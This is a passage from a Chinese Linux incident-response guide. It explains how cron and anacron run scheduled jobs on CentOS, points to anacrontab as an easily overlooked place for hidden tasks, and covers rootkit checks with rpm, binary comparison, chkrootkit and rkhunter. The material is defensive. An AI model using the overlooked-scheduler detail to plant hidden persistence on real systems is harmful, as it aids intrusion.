42&nbsp;4&nbsp;1&nbsp;*&nbsp;*&nbsp;root&nbsp;run-parts&nbsp;/etc/cron.monthly</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">run-parts命令位于/usr/bin/run-parts，内容是很简单的一个shell脚本，就是遍历目标文件夹，执行第一层目录下的可执行权限的文件。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">所以在CentOS5下是实际是通过/etc/crontab来运行/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly,/etc/cron.monthly下面的脚本的。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里我们注意到在/etc/cron.daily, /etc/cron.weekly,/etc/cron.monthly下都有一个脚本0anacron</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@jianshe_28&nbsp;cron.daily]#&nbsp;cat&nbsp;/etc/cron.daily/0anacron&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&#39;^#&#39;&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&#39;^$&#39;
if&nbsp;[&nbsp;!&nbsp;-e&nbsp;/var/run/anacron.pid&nbsp;];&nbsp;then
&nbsp;&nbsp;&nbsp;&nbsp;anacron&nbsp;-u&nbsp;cron.daily
fi
[root@jianshe_28&nbsp;cron.daily]#&nbsp;cat&nbsp;/etc/cron.weekly/0anacron&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&#39;^#&#39;&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&#39;^$&#39;
if&nbsp;[&nbsp;!&nbsp;-e&nbsp;/var/run/anacron.pid&nbsp;];&nbsp;then
&nbsp;&nbsp;&nbsp;&nbsp;anacron&nbsp;-u&nbsp;cron.weekly
fi
[root@jianshe_28&nbsp;cron.daily]#&nbsp;cat&nbsp;/etc/cron.monthly/0anacron&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&#39;^#&#39;&nbsp;|&nbsp;grep&nbsp;-v&nbsp;&#39;^$&#39;
if&nbsp;[&nbsp;!&nbsp;-e&nbsp;/var/run/anacron.pid&nbsp;];&nbsp;then
&nbsp;&nbsp;&nbsp;&nbsp;anacron&nbsp;-u&nbsp;cron.monthly
fi</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这里就需要介绍一些/usr/sbin/anacron，anacron是干什么的？</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">anacron主要在处理非 24 小时一直启动的 Linux 系统的 crontab 的运行。所以 anacron 并不能指定何时运行某项任务， 而是以天为单位或者是在启动后立刻进行 anacron 的动作，他会去检查停机期间应该进行但是并没有进行的 crontab 任务，并将该任务运行一遍后，anacron 就会自动停止了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">anacron的配置文件是/etc/anacrontab</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@jianshe_28&nbsp;cron.daily]#&nbsp;cat&nbsp;/etc/anacrontab&nbsp;
#&nbsp;/etc/anacrontab:&nbsp;configuration&nbsp;file&nbsp;for&nbsp;anacron
#&nbsp;See&nbsp;anacron(8)&nbsp;and&nbsp;anacrontab(5)&nbsp;for&nbsp;details.
SHELL=/bin/sh
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
1&nbsp;&nbsp;&nbsp;&nbsp;65&nbsp;&nbsp;&nbsp;&nbsp;cron.daily&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;run-parts&nbsp;/etc/cron.daily
7&nbsp;&nbsp;&nbsp;&nbsp;70&nbsp;&nbsp;&nbsp;&nbsp;cron.weekly&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;run-parts&nbsp;/etc/cron.weekly
30&nbsp;&nbsp;&nbsp;&nbsp;75&nbsp;&nbsp;&nbsp;&nbsp;cron.monthly&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;run-parts&nbsp;/etc/cron.monthly</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">具体含义如下：</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span><img src="http://p1.qhimg.com/t01765976e3e683e862.png" title="t01765976e3e683e862.png" alt="http://p3.qhimg.com/t01765976e3e683e862.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第一部分是轮回天数，即是指任务在多少天内执行一次，monthly 就是一个月（30天）内执行，weekly 即是在一周之内执行一次。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第二部分 delay 是指轮回内的重试时间，这个意思有两部分，一个是 anacron 启动以后该服务 ready 暂不运行的时间（周任务的 70 delay 在 anacron 启动后70分钟内不执行，而处于 ready 状态），另一个是指如果该任务到达运行时间后却因为某种原因没有执行（比如前一个服务还没有运行完成，anacron 在 /etc/init.d 的脚本中加了一个 -s 参数，便是指在前一个任务没有完成时不执行下一个任务），依然以周任务和月任务为例，周任务在启动 anacron 后的 &nbsp;70 分钟执行，月任务在服务启动后 75 分钟执行，但是，如果月任务到达服务启动后 75 分钟，可是周任务运行超过5分钟依然没有完成，那月任务将会进入下一个 75 分钟的轮回，在下一个 75 分钟时再检查周任务是否完成，如果前一个任务完成了那月任务开始运行。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第三部分 job-identifier ，anacron 每次启动时都会在 /var/spool/anacron 里面建立一个以 job-identifier 为文件名的文件，里面记录着任务完成的时间，如果任务是第一次运行的话那这个文件应该是空的。anacron运行时，会去检查“/var/spool/anacron/这部分”文件中的内容，内容为一个日期，如下：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;/]#&nbsp;cat&nbsp;/var/spool/anacron/cron.
cron.daily&nbsp;&nbsp;&nbsp;&nbsp;cron.monthly&nbsp;&nbsp;cron.weekly&nbsp;&nbsp;&nbsp;
[root@localhost&nbsp;/]#&nbsp;cat&nbsp;/var/spool/anacron/cron.*
20170719
20170713
20170713</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">根据这个日期判断下面的第四部分要不要执行。 比如说这里写的是cron.daily，然后/var/spool/anacron/cron.daily文件中记录的日期为昨天的话，那anancron执行后就行执行这一行对应第四行的动作。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第四部分最为简单，仅仅是你想运行的命令</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">/usr/sbin/anacron常用参数：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">-s &nbsp;：开始连续的运行各项工作 (job)，会依据时间记录档的数据判断是否进行；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">-f &nbsp;：强制进行，而不去判断时间记录档的时间戳记；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">-n &nbsp;：立刻进行未进行的任务，而不延迟 (delay) 等待时间；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">-u &nbsp;：仅升级时间记录档的时间戳记，不进行任何工作。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">所以在CentOS5中已经通过/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly,/etc/cron.monthly已经通过/etc/crontab配置执行了，所以这里只是通过anacron -u来记录了执行的时间。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">CentOS6中：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;/]#&nbsp;cat&nbsp;/etc/issue
CentOS&nbsp;release&nbsp;6.5&nbsp;(Final)
Kernel&nbsp;\r&nbsp;on&nbsp;an&nbsp;\m
[root@localhost&nbsp;/]#&nbsp;cat&nbsp;/etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
HOME=/
#&nbsp;For&nbsp;details&nbsp;see&nbsp;man&nbsp;4&nbsp;crontabs
#&nbsp;Example&nbsp;of&nbsp;job&nbsp;definition:
#&nbsp;.----------------&nbsp;minute&nbsp;(0&nbsp;-&nbsp;59)
#&nbsp;|&nbsp;&nbsp;.-------------&nbsp;hour&nbsp;(0&nbsp;-&nbsp;23)
#&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;.----------&nbsp;day&nbsp;of&nbsp;month&nbsp;(1&nbsp;-&nbsp;31)
#&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;.-------&nbsp;month&nbsp;(1&nbsp;-&nbsp;12)&nbsp;OR&nbsp;jan,feb,mar,apr&nbsp;...
#&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;.----&nbsp;day&nbsp;of&nbsp;week&nbsp;(0&nbsp;-&nbsp;6)&nbsp;(Sunday=0&nbsp;or&nbsp;7)&nbsp;OR&nbsp;sun,mon,tue,wed,thu,fri,sat
#&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|&nbsp;&nbsp;|
#&nbsp;*&nbsp;&nbsp;*&nbsp;&nbsp;*&nbsp;&nbsp;*&nbsp;&nbsp;*&nbsp;user-name&nbsp;command&nbsp;to&nbsp;be&nbsp;executed</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">可以看到默认的/etc/crontab为空了。那么/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly, /etc/cron.monthly下面的任务是怎么执行的？</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们再仔细看一下，注意到CentOS5下的/etc/cron.d目录为空。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@jianshe_28&nbsp;cron.daily]#&nbsp;ll&nbsp;/etc/cron.d
total&nbsp;0</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">而CentOS6下有一个0hourly</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;/]#&nbsp;ll&nbsp;/etc/cron.d
total&nbsp;12
-rw-r--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;113&nbsp;Jul&nbsp;18&nbsp;19:36&nbsp;0hourly</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">看一下执行的任务</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;/]#&nbsp;cat&nbsp;/etc/cron.d/0hourly&nbsp;
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
HOME=/
01&nbsp;*&nbsp;*&nbsp;*&nbsp;*&nbsp;root&nbsp;run-parts&nbsp;/etc/cron.hourly</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">然后看一下/etc/cron.hourly所执行的脚本</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;/]#&nbsp;ll&nbsp;/etc/cron.hourly
total&nbsp;4
-rwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;409&nbsp;Jul&nbsp;18&nbsp;14:20&nbsp;0anacron
[root@localhost&nbsp;/]#&nbsp;cat&nbsp;/etc/cron.hourly/0anacron&nbsp;
#!/bin/bash
#&nbsp;Skip&nbsp;excecution&nbsp;unless&nbsp;the&nbsp;date&nbsp;has&nbsp;changed&nbsp;from&nbsp;the&nbsp;previous&nbsp;run&nbsp;
if&nbsp;test&nbsp;-r&nbsp;/var/spool/anacron/cron.daily;&nbsp;then
&nbsp;&nbsp;&nbsp;&nbsp;day=`cat&nbsp;/var/spool/anacron/cron.daily`
fi
if&nbsp;[&nbsp;`date&nbsp;+%Y%m%d`&nbsp;=&nbsp;&quot;$day&quot;&nbsp;];&nbsp;then
&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;0;
fi
#&nbsp;Skip&nbsp;excecution&nbsp;unless&nbsp;AC&nbsp;powered
if&nbsp;test&nbsp;-x&nbsp;/usr/bin/on_ac_power;&nbsp;then
&nbsp;&nbsp;&nbsp;&nbsp;/usr/bin/on_ac_power&nbsp;&amp;&gt;&nbsp;/dev/null
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;test&nbsp;$?&nbsp;-eq&nbsp;1;&nbsp;then
&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;fi
fi
/usr/sbin/anacron&nbsp;-s</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">然后看一下/etc/anacrontab的内容</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;/]#&nbsp;cat&nbsp;/etc/anacrontab&nbsp;
#&nbsp;/etc/anacrontab:&nbsp;configuration&nbsp;file&nbsp;for&nbsp;anacron
#&nbsp;See&nbsp;anacron(8)&nbsp;and&nbsp;anacrontab(5)&nbsp;for&nbsp;details.
SHELL=/bin/sh
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
#&nbsp;the&nbsp;maximal&nbsp;random&nbsp;delay&nbsp;added&nbsp;to&nbsp;the&nbsp;base&nbsp;delay&nbsp;of&nbsp;the&nbsp;jobs
RANDOM_DELAY=45
#&nbsp;the&nbsp;jobs&nbsp;will&nbsp;be&nbsp;started&nbsp;during&nbsp;the&nbsp;following&nbsp;hours&nbsp;only
START_HOURS_RANGE=3-22
#period&nbsp;in&nbsp;days&nbsp;&nbsp;&nbsp;delay&nbsp;in&nbsp;minutes&nbsp;&nbsp;&nbsp;job-identifier&nbsp;&nbsp;&nbsp;command
1&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;&nbsp;&nbsp;&nbsp;cron.daily&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nice&nbsp;run-parts&nbsp;/etc/cron.daily
7&nbsp;&nbsp;&nbsp;&nbsp;25&nbsp;&nbsp;&nbsp;&nbsp;cron.weekly&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nice&nbsp;run-parts&nbsp;/etc/cron.weekly
@monthly&nbsp;45&nbsp;&nbsp;&nbsp;&nbsp;cron.monthly&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nice&nbsp;run-parts&nbsp;/etc/cron.monthly</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这里多了两条配置</span></p><pre class="brush:bash;toolbar:false">RANDOM_DELAY=45</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">表示定时触发后随机延迟45分钟以内的时间再启动应用</span></p><pre class="brush:bash;toolbar:false">START_HOURS_RANGE=3-22</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">表示程序在3时至22时之间会启动</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">看到这里我们就明白了在CeontOS6 里面，crond会检查/etc/cron.d里面的配置，里面有一个0hourly文件，每小时去运行一次/etc/cron.hourly目录，该目录下面有一个0anacron文件，这样0anacron文件就能每小时运行一次，这里其实执行的是/usr/sbin/anacron -s。anacron读取配置文件/etc/anacrontab，将当前时间与/var/spool/anacron目录下面的文件里面的时间戳作对比，如果需要则去运行/etc/anacrontab对应的条目。</span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">总结：</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">应急响应中关于定时任务应该排查的/etc/crontab,/etc/cron.d,/var/spool/cron/{user},然后顺藤摸瓜去看其他调用的目录/etc/cron.hourly, /etc/cron.daily, /etc/cron.weekly, /etc/cron.monthly，/etc/anacrontab 。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">其中容易忽视的就是/etc/anacrontab</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在CentOS6下我们做个测试：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">编辑/etc/anacrontab</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">修改RANDOM_DELAY=1</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">添加1 &nbsp; &nbsp; &nbsp; 1 &nbsp; &nbsp; &nbsp; cron.test &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; echo 1 &gt;&gt; /tmp/1.txt</span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;cron.weekly]#&nbsp;/usr/sbin/anacron&nbsp;-s</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">等待一分多钟后，可以看到</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@localhost&nbsp;cron.weekly]#&nbsp;cat&nbsp;/var/spool/anacron/cron.test&nbsp;
20170719
[root@localhost&nbsp;cron.weekly]#&nbsp;cat&nbsp;/tmp/1.txt&nbsp;
1</pre><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">0x09 Rootkit</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">检查命令替换</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1）系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包,有哪些被篡改了,防止rpm也被替换,上传一个安全干净稳定版本rpm二进制到服务器上进行检查。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">例如我替换一下/bin/ps，然后使用rpm -qaV查看</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@vincenthostname&nbsp;tmp]#&nbsp;rpm&nbsp;-qaV
S.?....T.&nbsp;/bin/ps</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">2）比对命令的大小</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">例如正常的ps和netstat大小</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@vincent&nbsp;tmp]#&nbsp;ll&nbsp;/bin/ps
-rwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;87112&nbsp;11月&nbsp;15&nbsp;2012&nbsp;/bin/ps
[root@vincent&nbsp;tmp]#&nbsp;ll&nbsp;/bin/netstat
-rwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;128216&nbsp;5月&nbsp;10&nbsp;2012&nbsp;/bin/netstat</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">下面是其中有一次应急时的记录</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">[root@DataNode110&nbsp;admin]#&nbsp;ls&nbsp;-alt&nbsp;/bin/&nbsp;|&nbsp;head&nbsp;-n&nbsp;10
total&nbsp;10836
-rwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;625633&nbsp;Aug&nbsp;17&nbsp;16:26&nbsp;tawlqkazpu
dr-xr-xr-x.&nbsp;2&nbsp;root&nbsp;root&nbsp;4096&nbsp;Aug&nbsp;17&nbsp;16:26&nbsp;.
-rwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;1223123&nbsp;Aug&nbsp;17&nbsp;11:30&nbsp;ps
-rwxr-xr-x&nbsp;1&nbsp;root&nbsp;root&nbsp;1223123&nbsp;Aug&nbsp;17&nbsp;11:30&nbsp;netstat</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">可以看到ps和netstat是一样大的。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3）查看命令的修改时间，按修改时间排序</span></p><pre class="brush:bash;toolbar:false">ls&nbsp;-alt&nbsp;/bin/&nbsp;|&nbsp;head&nbsp;-n&nbsp;5</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">4）使用chkrootkit和rkhunter查看</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">chkrootkit</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1、准备gcc编译环境</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">对于CentOS系统，执行下述三条命令：</span></p><pre class="brush:bash;toolbar:false">&gt;&nbsp;yum&nbsp;-y&nbsp;install&nbsp;gcc&nbsp;gcc-c++&nbsp;make&nbsp;glibc*</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">2、下载chkrootkit源码</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">chkrootkit的官方网站为 http://www.chkrootkit.org ，下述下载地址为官方地址。为了安全起见，务必在官方下载此程序：</span></p><pre class="brush:bash;toolbar:false">&gt;&nbsp;[root@www&nbsp;~]#&nbsp;wget&nbsp;ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">3、解压下载回来的安装包</span></p><pre class="brush:bash;toolbar:false">&gt;&nbsp;[root@www&nbsp;~]#&nbsp;tar&nbsp;zxf&nbsp;chkrootkit.tar.gz</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">4、编译安装（后文命令中出现的“*”无需替换成具体字符，原样复制执行即可）</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">&gt;[root@www&nbsp;~]#&nbsp;cd&nbsp;chkrootkit-*
&gt;
&gt;[root@www&nbsp;~]#&nbsp;make&nbsp;sense</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">注意，上面的编译命令为make sense。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">5、把编译好的文件部署到/usr/local/目录中，并删除遗留的文件</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">&gt;[root@www&nbsp;~]#&nbsp;cd&nbsp;..
&gt;[root@www&nbsp;~]#&nbsp;cp&nbsp;-r&nbsp;chkrootkit-&nbsp;/usr/local/chkrootkit
&gt;[root@www&nbsp;~]#&nbsp;rm&nbsp;-r&nbsp;chkrootkit-</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">至此，安装完毕。</span></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">使用方法</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">安装好的chkrootkit程序位于 /usr/local/chkrootkit/chkrootkit</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">直接执行</span></p><pre class="brush:bash;toolbar:false">&gt;&nbsp;root@vm:~#&nbsp;/usr/local/chkrootkit/chkrootkit</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">rkhunter</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在安装了kbeast的系统上测试，发现检测效果不如rkhunter好。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下载地址： <a href="http://sourceforge.net/projects/rkhunter/files/">http://sourceforge.net/projects/rkhunter/files/</a>&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1）安装</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">tar&nbsp;-xvf&nbsp;rkhunter-1.4.0.tar.gz
cd&nbsp;rkhunter-1.4.0
./installer.sh&nbsp;–install</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在安装了kbeast的系统上测试，可以成功检测到。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">/usr/local/bin/rkhunter&nbsp;–check&nbsp;-sk
[19:50:27]&nbsp;Rootkit&nbsp;checks…
[19:50:27]&nbsp;Rootkits&nbsp;checked&nbsp;:&nbsp;389
[19:50:27]&nbsp;Possible&nbsp;rootkits:&nbsp;1
[19:50:27]&nbsp;Rootkit&nbsp;names&nbsp;:&nbsp;KBeast&nbsp;Rootkit</pre><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">2）在线升级</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">rkhunter是通过一个含有rootkit名字的数据库来检测系统的rootkits漏洞, 所以经常更新该数据库非常重要, 你可以通过下面命令来更新该数据库:</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行命令：</span></p><pre class="brush:bash;toolbar:false">&gt;&nbsp;rkhunter&nbsp;–update</pre><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">3）检测最新版本</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">让 rkhunter 保持在最新的版本；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行命令：</span></p><pre class="brush:bash;toolbar:false">&gt;&nbsp;rkhunter&nbsp;–versioncheck</pre><p style="text-indent: 2em;"><strong style="color: rgb(0, 112, 192); text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x10 病毒检测</span></strong></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a>&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="http://www.virscan.org">http://www.virscan.org</a>&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://www.virustotal.com/">https://www.virustotal.com/</a>&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://fireeye.ijinshan.com/">https://fireeye.ijinshan.com/</a>&nbsp;</span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, 